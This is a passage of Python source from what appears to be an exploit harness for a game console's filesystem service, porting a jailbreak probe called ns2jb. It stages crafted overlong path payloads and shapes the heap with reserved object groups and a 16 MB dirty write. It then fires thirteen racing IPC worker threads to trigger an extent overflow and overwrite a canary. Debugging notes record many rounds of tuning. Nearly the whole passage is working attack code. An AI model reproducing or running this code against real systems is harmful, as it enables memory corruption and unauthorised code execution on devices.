        # defer 100%) did not change it. The remaining difference is the PATH SHAPE: tail0-2 use a
        # directory-style path with a trailing slash, tail3 uses a file-style one with none, and the
        # guards (100% deferral) are directory-style. CIV_TAIL3_PATH overrides it directly, so the
        # hypothesis can be tested without guessing the exact string.
        self.stage("tail3", os.environ.get("CIV_TAIL3_PATH") or ("/" + ABSENT))
        self.stage("filler0", self.scratch + "/filler", 0x7f0)
        self.stage("filler1", self.scratch + "/filler2", 0x7f0)
        # guard0/guard1/page_absent are staged ns2jb-faithful (always normalized) up in the
        # canary-staging block above.
        self.stage("selected_dir", self.state["selected"])
        # canary_file's descriptor size must cover its path: the normalized chain is 1441 bytes
        # — a hardcoded 0x300 truncated the CREATE/verify path mid-way (pass-5 finding).
        canary_file_text = self.state.get("canary_chain") \
            or (self.state.get("canary_dir") or self.scratch) + "/canary"
        self.stage("canary_file", canary_file_text, max(0x300, len(canary_file_text) + 1))

        # CIV_STAGE_SWAP=x,y (round-48): exchange two staged pages' payload-heap
        # addresses AFTER all staging, BEFORE any verification uses the entries —
        # the verified paths (root_dir/scratch_dir/canary_file) are separate entries,
        # so a canary,filler0 swap leaves every verification byte-identical while the
        # canary's path bytes move to the filler's landing-prone page.
        stage_swap = os.environ.get("CIV_STAGE_SWAP")
        if stage_swap:
            first, second = (part.strip() for part in stage_swap.split(","))
            self.swap_staged_pages(first, second)

        results = {}
        self.stage("root_dir", "/")
        results["freeSpace"] = self.path_send(fh, 11, "root_dir")["data"][:8].hex()
        # The top-level scratch directory must exist before any child path is created.
        self.stage("scratch_dir", self.scratch)
        results["scratchCreate"] = self.path_send(fh, 2, "scratch_dir")["canonical"]
        # ns2jb creates directories with path command 2 and files with command 0.
        results["selected"] = self.path_send(fh, 2, "selected_dir")["result"]
        directory = self.scratch
        for index, segment in enumerate(SEGMENTS):
            directory += "/" + segment
            self.stage("seg%d" % index, directory)
            results["segment%d" % index] = self.path_send(fh, 2, "seg%d" % index)["result"]
        # Directories for the deep canary path (must exist before the canary file is created).
        canary_dir = self.state.get("canary_dir")
        if canary_dir:
            walked = self.scratch
            for index, name in enumerate(canary_dir[len(self.scratch) + 1:].split("/")):
                walked += "/" + name
                self.stage("canary_dir%d" % index, walked)
                results["canaryDir%d" % index] = self.path_send(fh, 2, "canary_dir%d" % index)["result"]
        # ns2jb's normalized canary: create every 32-'A' parent directory, then the file, then
        # verify GetEntryType returns result 0 / type 1 (probe-reserved-gap.cjs:210-215). Without
        # this chain the normalized canary was a MISSING path (0x202) — the original bug that
        # CIV_CANARY_DEPTH papered over.
        canary_chain = self.state.get("canary_chain")
        if canary_chain:
            parts = canary_chain[1:].split("/")
            # Root the chain at the scratch tree: parts[0] is the scratch directory (already
            # created above) and every parent must be created UNDER it. The old walk started at
            # "" and tried to mkdir /canary/AAAA... at the filesystem root (review 4.3).
            walked = "/" + parts[0]
            for index in range(1, len(parts)):
                walked += "/" + parts[index]
                self.stage("canary_chain%d" % index, walked)
                reply = self.path_send(fh, 2 if index < len(parts) - 1 else 0,
                                       "canary_chain%d" % index,
                                       b"" if index < len(parts) - 1 else u64(0) + u64(0x800))
                # Per-step diagnostics (round-25b: the old filter swallowed 0x202s — for mkdir
                # they mean "parent missing", and one failure silently kills the whole chain).
                # 0x202 on the FILE create with an existing parent would be surprising too.
                print("canary chain[%d/%d] len=%d -> 0x%x" % (index, len(parts) - 1,
                      len(walked), reply["result"]), flush=True)
            verify = self.path_send(fh, 7, "canary_file")
            vdata = verify.get("data") or b""
            vtype = struct.unpack_from("<I", vdata, 0)[0] if len(vdata) >= 4 else None
            results["canaryChainVerify"] = {"result": verify["result"], "type": vtype}
            if verify["result"] or vtype != 1:
                print("WARNING: normalized canary does not resolve to a file (%s)"
                      % results["canaryChainVerify"], flush=True)
        self.stage("marker_file", directory + "/" + MARKER)
        results["markerCreate"] = self.path_send(fh, 0, "marker_file", u64(0) + u64(1))["result"]
        results["canaryCreate"] = self.path_send(fh, 0, "canary_file", u64(0) + u64(0x800))["result"]
        results["canaryWrite"] = self.path_send(fh, 1, "canary_file", u64(0) + u64(0x800))["result"]
        results["canaryRead"] = self.path_send(fh, 0, "canary_file", u64(0) + u64(0x800))["data"][:8].hex()
        # CIV_COMMIT_DATA (todo #4, round-57): ns2jb creates scratch/commit_data ONCE in
        # setup at writeSize (16 MB) — `normal(saved, 0, filename, u64(0) + u64(writeSize))`
        # (probe-reserved-gap.cjs:208, :333) — then EVERY wave opens it (cmd 8, mode 3),
        # writes 16 MB dirty (cmd 1, send descriptor), and CMIF-closes before the 13 roles
        # launch (dirty_commit_data, called from worker_wave).
        if os.environ.get("CIV_COMMIT_DATA"):
            self.stage("commit_data", self.scratch + "/commit_data")
            results["commitDataCreate"] = self.path_send(
                fh, 0, "commit_data", u64(0) + u64(COMMIT_WRITE_SIZE))["result"]
        counters = self.cached_session("counters_handle", label + "-counters")
        results["counters"] = self.counters(counters)
        if reserve:
            group = self.reserve_group(label)
            self.state["outer"] = group["outer"]
            self.state["owner"] = group["handle"]
            self.state["rootCopy"] = group["rootCopy"]
            self.state["before"] = group["before"]
            self.state["held"] = group["held"]
            results["reservation"] = {k: group[k] for k in ("allocated", "expected", "matches", "outer")}
        self.state["setup"] = results
        return {"scratch": self.scratch, "root": state["root"], "mounted": self.state["mounted"],
                "counters": results["counters"], "results": results}

    def run(self, profile):
        plan = self.build_wave(profile)
        report = self.console.request("wave", plan=plan)
        report["packets"] = {step["role"]: hashlib.sha256(step["packet"]).hexdigest() for step in plan["steps"]}
        report["scratch"] = self.scratch
        report["setup"] = self.state.get("setup")
        RUNS.mkdir(exist_ok=True)
        path = RUNS / ("%s-%s.json" % (self.scratch.strip("/"), profile))
        path.write_text(json.dumps(report, indent=2) + "\n")
        return {"report": report, "file": str(path)}

    def release_group(self):
        """ns2jb closeGroup tail: close the copied root and the owner session handle.

        The wave's `release` role closes the wrapped outer from the native side, which frees the
        59 reserved objects but not the two session handles. ns2jb closes both explicitly before
        reserving again, so a retry does not accumulate handles (each leak is a live object in the
        game's handle table, and the process died on the second attempt without this).
        """
        # Off by default: the wave's own `release` role already closes the wrapped outer, which
        # frees the 59 objects, and issuing raw svcCloseHandle on the owner/rootCopy then froze the
        # console (the two-attempt run died here with no reservation trace at all). ns2jb closes
        # comparable handles in its own JS table rather than as raw SVC handles.
        if os.environ.get("CIV_RELEASE_HANDLES") != "1":
            self.state["rootCopy"] = self.state["owner"] = None
            return
        sdk = self.console.request("status")["sdkBase"]
        for key in ("rootCopy", "owner"):
            handle = self.state.get(key)
            if handle:
                try:
                    self.console.request("call", address=sdk + 0x168be4, args=[handle])
                except Exception:
                    pass
            self.state[key] = None

    def rereserve(self, label="gap"):
        """Reserve a fresh group after a wave released the previous one (ns2jb closeGroup/retryWave).

        Only the reservation moves; the mounted save session, the scratch tree and the staged path
        pages all survive, which is what makes in-process retries cheap next to a fresh payload.
        """
        self.release_group()
        group = self.reserve_group(label)
        self.state["outer"] = group["outer"]
        self.state["owner"] = group["handle"]
        self.state["rootCopy"] = group["rootCopy"]
        self.state["before"] = group["before"]
        self.state["held"] = group["held"]
        return {k: group[k] for k in ("allocated", "expected", "matches", "outer")}

    def mount_accessor(self, name):
        """Find a mount's accessor in the latest relocation mounts scan (same detector as
        relocate_host.cmd_mounts): name at window +0, zero pad at +8, implementation
        > 0x100000000 at +0x10, accessor = base + offset - 24."""
        runs = Path(__file__).with_name("..") / "relocation" / "runs"
        files = sorted(runs.glob("*mounts*.json"), key=lambda path: path.stat().st_mtime)
        data = json.loads(files[-1].read_text())
        for block in data.get("results", []):
            for hit in block.get("hits", []):
                window = bytes.fromhex(hit["hex"])
                if len(window) < 0x18:
                    continue
                if (window[:8].split(b"\0")[0] == name.encode()
                        and int.from_bytes(window[8:16], "little") == 0
                        and int.from_bytes(window[0x10:0x18], "little") > 0x100000000):
                    return block["base"] + hit["offset"] - 24
        raise AssertionError("mount %r not present in the latest mounts scan" % name)

    def _stage_extent_ns2jb(self, profile, payload=None):
        """ns2jb's input layout: one `extent + 1` buffer split into five 0x800 pieces, where
        piece 0 is the trigger input and pieces 1..4 are the four tail inputs. The harness's
        stage_extent instead writes segments at the end of each piece and gives the tails
        their own paths, which only works for the abort profiles.

        payload: an explicit wave payload (copyField's wave(profile, readSize, bytes) form).
        ns2jb's checks apply: it must start with '/..\\', contain no embedded NUL, and split
        into exactly five 0x800 pieces (markerOffset + tail + 1 = 0x2340 + tail + 1 with the
        tail <= 0xff keeps piece 4 at >= 0x340 bytes). The profile-derived branches below are
        skipped entirely when a payload is supplied."""
        if payload is not None:
            payload = bytearray(payload)
            assert payload[:4] == b"/..\\", "Custom copy prefix differs"
            assert 0 not in payload[:-1], "Custom copy has an embedded terminator"
            profile = None   # a custom payload replaces the profile-derived branches entirely
        else:
            payload = bytearray(b"/" * (EXTENT + 1))
            payload[EXTENT] = 0
        if profile is not None and profile.startswith("extent-"):
            payload[0:len(self.scratch) + 1] = (self.scratch + "/").encode()
            for index, segment in enumerate(SEGMENTS):
                at = (index + 1) * 0x800
                text = ("/" + segment + "/").encode()
                payload[at:at + len(text)] = text
            basename = MARKER if profile == "extent-present" else ABSENT
            # The trigger resolved to type 0 (a directory) with the basename at the very end of
            # the extent (0x2435), i.e. the fold stopped short of it. ns2jb's documented
            # markerOffset is 0x2340, inside that reach, so place it there by default
            # (CIV_EXTENT_MARKER=end restores the extent-end placement).
            # BUGFIX (external review, verified against ns2jb probe-reserved-gap.cjs:346-356):
            # ns2jb's isExtent writes the basename FLUSH against the terminator (extent −
            # basename.length, no trailing slashes) for BOTH extent-present and extent-absent;
            # markerOffset 0x2340 is only used by isPositive, where the target is a DIRECTORY
            # (trailing '/' fill is a valid directory path). Our 0x2340 default left 245 trailing
            # '/'s after a FILE name — fsp-srv returns 0x202 for a file path with trailing
            # slashes — making selectedMarker (result 0/type 1) impossible at that placement:
            # r16a2's trigger 0x202 was the full folded path hitting the slashes; the type-0
            # samples were folds stopping at a directory piece. CIV_MARKER_OFFSET still overrides
            # for explicit sweeps.
            marker_at = int(os.environ.get("CIV_MARKER_OFFSET") or "0", 0) or (EXTENT - len(basename))
            payload[marker_at:marker_at + len(basename)] = basename.encode()
        elif profile == "positive":
            payload[0:EXTENT] = b"B" * EXTENT
            selected = self.state["selected"].encode()
            # CIV_MARKER_OFFSET applies here too: with the default 0x2340 the positive trigger
            # returns 0x2EEA02 (normalizer abort), but round-19 found 0x2140 resolves (result 0).
            marker_at = int(os.environ.get("CIV_MARKER_OFFSET") or "0", 0) or MARKER_OFFSET
            payload[marker_at:marker_at + len(selected)] = selected
            payload[marker_at + len(selected):EXTENT] = b"/" * (EXTENT - marker_at - len(selected))
            payload[0:4] = b"/..\\"
        elif profile is not None:
            payload[0:4] = b"/../"
        pieces = [bytes(payload[at:at + 0x800]) for at in range(0, len(payload), 0x800)]
        assert len(pieces) == 5, "unexpected receive extent"
        # The trigger packet uses the staged piece-0 length; ns2jb's copyField waves declare
        # 0x800 for the trigger (pieces[0] is always full), so this matches for custom payloads.
        if payload is not None:
            assert len(pieces[0]) == 0x800, "Custom copy trigger piece must be a full block"
        # DIAGNOSTIC (CIV_TAIL3_PAD=1): tail3's input is piece 4 = extent 0x2000..0x2440, the
        # only tail whose input terminates in the marker basename -- i.e. the only path that
        # RESOLVES. tails 0-2 carry segment/padding content and defer 56-100%; tail3 never
        # defers (0/12+). The earlier CIV_EXTENT_MARKER=end "refutation" moved the marker from
        # 0x2340 to 0x2435 -- BOTH inside piece 4 -- so it never actually left tail3's input.
        # This knob blanks tail3's input to '/' padding (same length, non-resolving) to test
        # deferral-of-unresolvable-inputs directly. Breaks the fold by construction; do not
        # count a padded run toward selectedMarker.
        if os.environ.get("CIV_TAIL3_PAD"):
            pieces[4] = b"/" * len(pieces[4])
        # CIV_TAIL3_SIZE=0x800: pad tail3's input to the same 0x800 descriptor size its siblings
        # carry (trailing '/' collapse identically, marker position unchanged -> fold-preserving).
        # tail3 is the ONLY role whose request buffer is not 0x800 (its piece is the extent tail,
        # 0x441 bytes): small IPC payloads can ride the session's static buffer instead of the
        # user-buffer path the 0x800 requests use, which would explain exactly "only tail3 never
        # defers". If it defers padded, the discriminator is the size, not the path content.
        tail3_size = int(os.environ.get("CIV_TAIL3_SIZE") or "0", 0)
        if tail3_size and tail3_size > len(pieces[4]):
            pieces[4] = pieces[4] + b"/" * (tail3_size - len(pieces[4]))
        # ns2jb places these at FIXED relative offsets -- triggerInput = b+0x30000 and
        # tailInputs[i] = b+0x32000 + i*0x2000, i.e. trigger at +0 and the four pieces at
        # +0x2000, +0x4000, +0x6000, +0x8000. The extent overflow reads the path out of this
        # span, so ad-hoc allocations (as before) cannot fold. Reproduce the span exactly.
        span = 0x8000 + 0x800
        region = self.console.request("alloc", pages=(span + 0xFFF) // 0x1000)["address"]
        self.state.setdefault("wave_allocs", []).append(region)
        trigger = self.paths["trigger"]
        trigger["address"], trigger["size"] = region, len(pieces[0])
        self.console.request("write", address=region, hex=pieces[0].hex())
        for index in range(4):
            entry = self.paths["tail%d" % index]
            entry["address"] = region + 0x2000 * (index + 1)
            entry["size"] = len(pieces[index + 1])
            self.console.request("write", address=entry["address"], hex=pieces[index + 1].hex())

    def _clone_handle(self, handle, label):
        reply = parse_reply(self.console.request("send", handle=handle, packet=control(2))["hex"])
        assert not reply["result"] and len(reply["moves"]) == 1, label + " clone failed: " + str(reply["result"])
        return reply["moves"][0]

    def _domain_object(self, command, label):
        gap = self.state["gap"]
        reply = parse_reply(self.console.request("send", handle=gap["handle"],
            packet=domain(gap["root"], command).hex())["hex"], domain_reply=True, data_size=0)
        assert not reply["result"] and len(reply["objects"]) == 1, label + " failed: " + str(reply["result"])
        return reply["objects"][0]

    # Profiles that actually overwrite the canary. ns2jb only reaches them once `extent-present`
    # has qualified a readSize; a miss there sets `placementUncertain` and retains resources
    # instead of retrying blind. Refuse them here unless the caller sets CIV_ALLOW_OVERWRITE.
    OVERWRITE_PROFILES = ("negative", "positive", "address-encoding-control", "binary-control")

    def dirty_commit_data(self):
        """ns2jb's per-wave 'Dirty gap commit data' step (probe-reserved-gap.cjs:333-338,
        todo #4, round-57 ns2jb-diff): open scratch/commit_data (mode 3), Write COMMIT_WRITE_SIZE
        bytes through a send descriptor, close — before the 13-role wave launches.

        BOOT-41..46 history (the ladder's findings, all now fixed):
        - 41/42: the single 16 MB and 1 MB writes returned 0x..6402 — NOT a size cap.
        - 44: my GetSize probe used IFile cmd 2 = FLUSH (libnx ground truth: IFile is
          Read=0/Write=1/Flush=2/SetSize=3/GetSize=4, trailing layout identical to IStorage
          where leak_read's live GetSize = cmd 4). 'fileSize 0' was a Flush reply's zero tail,
          so the empty-file theory was built on garbage.
        - 45: my close_object sent on fh ITSELF corrupted the save-FS session (the next
          CloneSession on fh died) — close_object closes DOMAIN OBJECT IDS, and a raw
          session handle from OpenFile's moves is not one.
        - 46: SetSize(3) returned success yet writes still failed at every size — the write
          failure is invariant to file size, so descriptor mode / open mode are the remaining
          untested packet variables; the ladder now probes them.
        - The close is ns2jb's own form: s.close(handle) = the SDK svcCloseHandle stub,
          reachable here as the console 'svc' command (name=closeHandle) — raw svcCloseHandle
          on OUR OWN object handle, exactly what their wave does per wave.
        """
        fh = self.state["fh"]
        buf = self.state.get("commit_data_buf")
        if buf is None:
            buf = self.console.request("alloc", pages=COMMIT_WRITE_SIZE // 0x1000)["address"]
            self.state["commit_data_buf"] = buf

        def close_file(handle):
            try:
                self.console.request("svc", name="closeHandle", args=[handle])
            except Exception:
                pass

        def file_cmd(handle, command, input=b"", send=(), receive=()):
            raw = self.console.request("send", handle=handle,
                packet=packet(command, input, send=send, receive=receive).hex())["hex"]
            return parse_reply(raw)

        diag = {}
        # Step 0/1: existence + OpenFile mode 3 (ns2jb normal(saved, 8, filename, [3,0,0,0])).
        # BOOT-50: the setup-level CreateFile can fail silently (results["commitDataCreate"]
        # is recorded but unchecked) — the ladder then saw 0x202 on every draw and degraded.
        # SELF-HEAL: if the file is missing, CreateFile it here (cmd 0 + size arg) and re-probe.
        diag["getEntryType"] = self.path_send(fh, 7, "commit_data").get("result")
        if diag["getEntryType"]:
            create = self.path_send(fh, 0, "commit_data", u64(0) + u64(COMMIT_WRITE_SIZE))
            diag["recreate"] = create.get("result")
            diag["getEntryType"] = self.path_send(fh, 7, "commit_data").get("result")
            print("commit_data was missing: setup CreateFile failed silently; ladder recreate=%s"
                  % diag["recreate"], flush=True)
        opened = self.path_send(fh, 8, "commit_data", struct.pack("<I", 3))
        diag["open"] = opened.get("result")
        diag["openMoves"] = len(opened.get("moves") or [])
        if opened.get("result") or not opened.get("moves"):
            print("commit_data ladder: " + json.dumps(diag), flush=True)
            return False
        file_handle = opened["moves"][0]
        # Step 2: GetSize — IFile cmd 4 (libnx fsFileGetSize ground truth).
        try:
            size_reply = file_cmd(file_handle, 4)
            file_size = struct.unpack_from("<Q", size_reply["data"], 0)[0] if not size_reply["result"] else None
            diag["getSize"] = size_reply.get("result")
            diag["fileSize"] = file_size
        except Exception as exc:
            diag["getSize"] = "no-SFCO (%s)" % type(exc).__name__
            file_size = None
        # Step 3: SetSize — IFile cmd 3 (libnx fsFileSetSize) — extend if short.
        if file_size is None or file_size < COMMIT_WRITE_SIZE:
            try:
                setsize = file_cmd(file_handle, 3, u64(COMMIT_WRITE_SIZE))
                diag["setSize"] = setsize.get("result")
                verify = file_cmd(file_handle, 4)
                diag["fileSizeAfter"] = (struct.unpack_from("<Q", verify["data"], 0)[0]
                                         if not verify.get("result") else None)
            except Exception as exc:
                diag["setSize"] = "no-SFCO (%s)" % type(exc).__name__
        # Step 4: Write descent across descriptor modes — the two untested packet
        # variables (mode 1 = ns2jb's send descriptor; 3 and 0 = the remaining
        # HipcMapAlias encodings). First success dirties the full 16 MB at that size.
        # BOOT-41..46: writes invariant to file size — mode is what is left.
        for mode in (1, 3, 0):
            for write_size in (0x100000, 0x10000, 0x1000, 0x100):
                if write_size == 0x100000 and mode != 1:
                    continue
                try:
                    reply = file_cmd(file_handle, 1, u64(0) + u64(0) + u64(write_size),
                                      send=[{"address": buf, "size": write_size, "mode": mode}])
                    ok_write = not reply.get("result")
                    diag["write0x%x_m%d" % (write_size, mode)] = reply.get("result")
                except Exception as exc:
                    diag["write0x%x_m%d" % (write_size, mode)] = "no-SFCO (%s)" % type(exc).__name__
                    ok_write = False
                if ok_write:
                    # Chunk-loop from 0 ALWAYS (BOOT-47 BUG: the 1MB probe had set dirtied=
                    # COMMIT_WRITE_SIZE without writing the remaining 15 chunks — every
                    # 'DIRTIED 16MB' wave actually dirtied ONE 1MB). write_size chunks to 16MB.
                    # Also BOOT-42 vs 47: the 16MB single-shot poisons the session (its failed
                    # descriptor made every later write on the handle fail) — the descent
                    # therefore starts at 1MB and never sends the 16MB form.
                    dirtied = write_size
                    while dirtied < COMMIT_WRITE_SIZE:
                        part = min(write_size, COMMIT_WRITE_SIZE - dirtied)
                        r = file_cmd(file_handle, 1, u64(dirtied) + u64(0) + u64(part),
                                     send=[{"address": buf + dirtied, "size": part, "mode": mode}])
                        if r.get("result"):
                            print("commit_data chunk at 0x%x: 0x%X" % (dirtied, r["result"]), flush=True)
                            break
                        dirtied += part
                    print("commit_data dirtied 0x%x (mode %d, 0x%x chunks) | ladder: %s"
                          % (dirtied, mode, write_size, json.dumps(diag)), flush=True)
                    close_file(file_handle)
                    return True
        # Step 5: open-mode probe — a mode-3-opened file rejecting writes at every
        # descriptor mode/size; try open mode 2 (write-only class) before giving up.
        close_file(file_handle)
        for open_mode in (2,):
            try:
                reopened = self.path_send(fh, 8, "commit_data", struct.pack("<I", open_mode))
            except Exception:
                continue
            if reopened.get("result") or not reopened.get("moves"):
                continue
            handle2 = reopened["moves"][0]
            try:
                reply = file_cmd(handle2, 1, u64(0) + u64(0) + u64(0x10000),
                                 send=[{"address": buf, "size": 0x10000, "mode": 1}])
                diag["writeMode%dOpen" % open_mode] = reply.get("result")
                if not reply.get("result"):
                    dirtied = 0x10000
                    while dirtied < COMMIT_WRITE_SIZE:
                        part = min(0x10000, COMMIT_WRITE_SIZE - dirtied)
                        r = file_cmd(handle2, 1, u64(dirtied) + u64(0) + u64(part),
                                     send=[{"address": buf + dirtied, "size": part, "mode": 1}])
                        if r.get("result"):
                            print("commit_data chunk at 0x%x: 0x%X" % (dirtied, r["result"]), flush=True)
                            break
                        dirtied += part
                    print("commit_data dirtied 0x%x (open mode %d) | ladder: %s"
                          % (dirtied, open_mode, json.dumps(diag)), flush=True)
                    close_file(handle2)
                    return True
            except Exception as exc:
                diag["writeMode%dOpen" % open_mode] = "no-SFCO (%s)" % type(exc).__name__
            close_file(handle2)
        print("commit_data dirty write FAILED | ladder: " + json.dumps(diag), flush=True)
        return False

    def worker_wave(self, profile="abort-control", tries=1, payload=None, read_size=None):
        """payload: explicit copyField payload (wave(profile, readSize, bytes) — staged by
        _stage_extent_ns2jb in place of the profile-derived input). read_size: the hole
        read's size override (ns2jb's copyField waves pass the qualified probeReadSize);
        the hole buffer is grown if the override exceeds the staged PROBE_READ_SIZE."""
        if profile in self.OVERWRITE_PROFILES and not os.environ.get("CIV_ALLOW_OVERWRITE"):
            raise SystemExit(
                "refusing overwrite profile %r: ns2jb only runs these after extent-present has "
                "qualified a readSize (`selectedMarker && hasWindow`), which is not yet true here.\n"
                "Set CIV_ALLOW_OVERWRITE=1 only once the canary placement is trustworthy." % profile)
        """Worker-driven port of ns2jb probe-reserved-gap.cjs wave().

        Thirteen native worker threads replace the JS posts: they park on the `master` gate,
        fire their role's IPC at the measured delay, and the trigger/guard workers sample the
        live control flags. abort-control pre-arms `completedFlag`, so the guard turns the
        trigger path into an empty path and the request aborts instead of overwriting.
        """
        if tries > 1:
            # ns2jb's retryWave calls wave() up to three times, and each wave reserves its own
            # 59-object group: the `release` role closes group.outer mid-wave (probe-reserved-gap
            # line 383 writes closeObject(group.outer) into requests[9]), so a retry against the
            # old group runs on a released reservation and cannot qualify. Re-reserve between
            # attempts; the mounted session itself stays usable, so this is cheap next to a load.
            last = None
            for attempt in range(tries):
                if attempt:
                    self.rereserve()
                self.state["wave_allocs"] = []
                last = self.worker_wave(profile, 1, payload=payload, read_size=read_size)
                # Each attempt overwrites the same report file, so keep a per-attempt copy: with
                # several samples per load the individual rows are what we compare.
                try:
                    # worker_wave writes runs/worker-wave-<profile>.json (not run()'s scratch-based
                    # name), and each attempt overwrites it.
                    source = RUNS / ("worker-wave-%s.json" % profile)
                    if source.exists():
                        keep = RUNS / ("worker-wave-%s-attempt%d.json" % (profile, attempt + 1))
                        keep.write_text(source.read_text())
                except OSError:
                    pass
                # Release this attempt's pages before the next one: the payload's own heap held
                # every frame, request page, ctrl page and buffer, and exhausting it is what killed
                # the payload on attempts 2-3 (~100 pages per wave, never freed).
                allocs = self.state.get("wave_allocs") or []
                if attempt < tries - 1 and allocs:
                    try:
                        self.console.request("freeAddresses", addresses=allocs)
                    except Exception:
                        pass
                # ns2jb's retryWave keeps fishing until the profile's own acceptance:
                #   extent-present  -> hasWindow && selectedMarker  (probe-reserved-gap.cjs:616)
                #   positive/overwrite -> canaryChanged && allPending && margin >= 300
                #     (i.e. changedPaths includes 'canary' -- the alias landing, :532)
                #   everything else  -> windowOk
                # Breaking on windowOk alone stopped round-23's extent-present boot after
                # ONE attempt (selectedMarker still open), and boot-16's positive harvest
                # after ONE attempt (canaryChanged still open -- two lottery draws lost).
                if profile == "extent-present":
                    done = bool(last.get("windowOk") and last.get("selectedMarker"))
                elif profile in self.OVERWRITE_PROFILES:
                    done = bool(last.get("windowOk") and last.get("canaryChanged"))
                else:
                    done = bool(last.get("windowOk"))
                if done:
                    break
            self.state["wave_allocs"] = []
            return last
        sdk = self.console.request("status")["sdkBase"]
        if not self.state.get("mounted"):        # reuse the reservation across attempts
            self.setup(reserve=True)
        gap = self.state["gap"]
        fh, owner, outer = self.state.get("fh"), self.state.get("owner"), self.state.get("outer")
        assert fh and owner and outer, "mounted FS / reservation unavailable"
        # CIV_COMMIT_DATA: the per-wave 16 MB dirty write BEFORE the 13 roles launch
        # (ns2jb:333-338 — the wave's heap-shaping step; todo #4, round-57).
        # dirty_commit_data degrades gracefully (diagnostic ladder + False) so the
        # wave ALWAYS runs — the regime print marks which heap state it ran under.
        if os.environ.get("CIV_COMMIT_DATA"):
            dirtied = self.dirty_commit_data()
            print("wave regime: commit_data %s" % ("DIRTIED (ns2jb-faithful)" if dirtied else "UNDIRTIED (degraded)"),
                  flush=True)

        packets = {step["role"]: (bytes.fromhex(step["packet"]) if isinstance(step["packet"], str)
                                    else bytes(step["packet"]))
                   for step in self.build_wave(profile)["steps"]}
        # build_wave's stage_extent creates the trigger/tail entries; rewrite their pages and
        # sizes to ns2jb's layout, then rebuild the tail packets that depend on those sizes.
        self._stage_extent_ns2jb(profile, payload=payload)
        # The trigger packet was built against the pre-layout address, so rebuild both it and the
        # tail packets once the fixed span is in place.
        packets["trigger"] = path_packet(7, self.paths["trigger"])
        for index in range(4):
            packets["tail%d" % index] = path_packet(1002, self.paths["tail%d" % index])
        if read_size is not None:
            # copyField waves pass the qualified readSize; grow the hole buffer if needed.
            if read_size > self.paths["hole"]["size"]:
                self.paths["hole"]["address"] = self.console.request(
                    "alloc", pages=(read_size + 0xFFF) // 0x1000)["address"]
                self.paths["hole"]["size"] = read_size
            packets["hole"] = context_bytes(packet(0, u64(0) + u64(read_size),
                receive=[{"address": self.paths["hole"]["address"], "size": read_size,
                          "mode": 1}]), 3)
        if os.environ.get("CIV_SACRIFICE"):
            packets["sacrifice0"] = context_bytes(path_packet(7, self.paths["sacrifice0"]), 3)
        roles = ["commit", "hole", "tail0", "tail1", "tail2", "tail3", "canary",
                 "filler0", "filler1", "release", "guard0", "guard1", "trigger"] \
            + (["sacrifice0"] if os.environ.get("CIV_SACRIFICE") else [])
        assert all(role in packets for role in roles), "missing role packets"
        # CIV_SACRIFICE_DRAIN was reverted: drain order follows the HANDLE's creation
        # slot (round-13: swapping clients[6]<->[11] handles moved the canary's drain),
        # so the EXISTING CIV_SLOT_SWAP=10,13 (handle swap) is the correct and complete
        # implementation of the round-55 drain-order design — a roles-list swap would
        # change nothing the handle swap does not already do. Do not re-add.

        ctrl = self.console.request("alloc", pages=1)["address"]
        self.state.setdefault("wave_allocs", []).append(ctrl)
        gate = {"master": ctrl, "holeDone": ctrl + 8, "released": ctrl + 0x10,
                "guard": ctrl + 0x18, "closed": ctrl + 0x40, "canaryGate": ctrl + 0x48}
        CF, HF, EH = ctrl + 0x20, ctrl + 0x24, ctrl + 0x28
        CD, HD, SD = ctrl + 0x2c, ctrl + 0x30, ctrl + 0x34
        ZB, OB = ctrl + 0x38, ctrl + 0x3c
        # 0x80 so the extra `closed` event at +0x40 sits in an initialised slot. The SDK event
        # struct is 8 bytes (`clear` does `add x8,x0,#4`), so the gates MUST stay 8-byte spaced:
        # ctrl+0x1c would overlap `guard` (0x18-0x1f) and `CF` at 0x20 and corrupt the wave.
        self.console.request("write", address=ctrl, hex="00" * 0x80)
        for g in gate.values():
            self.console.request("call", address=sdk + SDK_OFFSETS["initialize"], args=[g, 0, 0])
            self.console.request("call", address=sdk + SDK_OFFSETS["clear"], args=[g, 0, 0])
        tail = bytearray(0x20)
        struct.pack_into("<I", tail, 0x00, 1 if profile == "abort-control" else 0)          # completedFlag
        struct.pack_into("<I", tail, 0x04, 1 if profile == "abort-hole-control" else 0)     # holeFinished
        struct.pack_into("<I", tail, 0x1c, 1)                                               # oneByte
        self.console.request("write", address=ctrl + 0x20, hex=bytes(tail).hex())

        # ns2jb labels commit + tails + release as context 3, the rest 9. build_wave used
        # a different split, so re-apply the context bytes here (idempotent: context_bytes
        # rewrites the same header fields).
        ctx3 = {"commit", "tail0", "tail1", "tail2", "tail3", "release"}
        # "release" is close_object(outer, 3) — context_bytes would clobber its object id (byte
        # 20 = at+4); the close packet carries its own context and is passed through untouched.
        packets = {role: (packets[role] if role == "release" else
                          context_bytes(packets[role], 3 if role in ctx3 else 9))
                   for role in roles}
        requests = {role: self.console.request("alloc", pages=1)["address"] for role in roles}
        self.state.setdefault("wave_allocs", []).extend(requests.values())
        trigger = self.paths["trigger"]["address"]

        # ns2jb's own corrections: `commit` is `packet(10)` with no descriptors (the dirty
        # 0x1000000 write is a separate host ipc), and `storage` is a plain packet(200) on the
        # root session, not a domain request. The guard packet uses two guard-path descriptors
        # of size 0x301 rather than [guard, page_absent].
        # Root rides the cached session: the wave body reopens it per attempt otherwise.
        root = self.cached_session("wave_root_handle", "wave-root")
        # Rebuilds must re-apply their context (context_bytes was applied to the pre-rebuild
        # packets at line ~1473; these overwrites dropped the CMIF context otherwise).
        packets["commit"] = context_bytes(packet(10), 3)
        g0, g1 = self.paths["guard0"], self.paths["guard1"]
        guard_packet = path_packet(5, {"address": g0["address"], "size": 0x301},
                                   descriptors=[{"address": g0["address"], "size": 0x301},
                                                {"address": g1["address"], "size": 0x301}])
        packets["guard0"] = packets["guard1"] = context_bytes(guard_packet, 9)
        for role in roles:
            self.console.request("write", address=requests[role], hex=bytes(packets[role]).hex())
        # ns2jb builds its 13 clients ONCE, outside wave() (probe-reserved-gap.cjs lines 271-275),
        # and reuses them across every retryWave attempt — only the {u32} pages' CONTENTS are
        # refreshed per wave (their b+0x2a00 form). Cloning 13 client sessions per attempt (plus
        # re-opening the storage) exhausted fsp-srv's session table by attempt 3; the third
        # attempt's CloneSession then blocked inside the payload's single-threaded server — the
        # reproduced "dies on attempt 3" freeze (handoff §17). Cache clients + pages; on reuse,
        # rewrite the owner page with THIS attempt's owner handle and COPY the list so the
        # per-attempt client-order swaps below stay correct.
        cached = self.state.get("wave_clients")
        if cached:
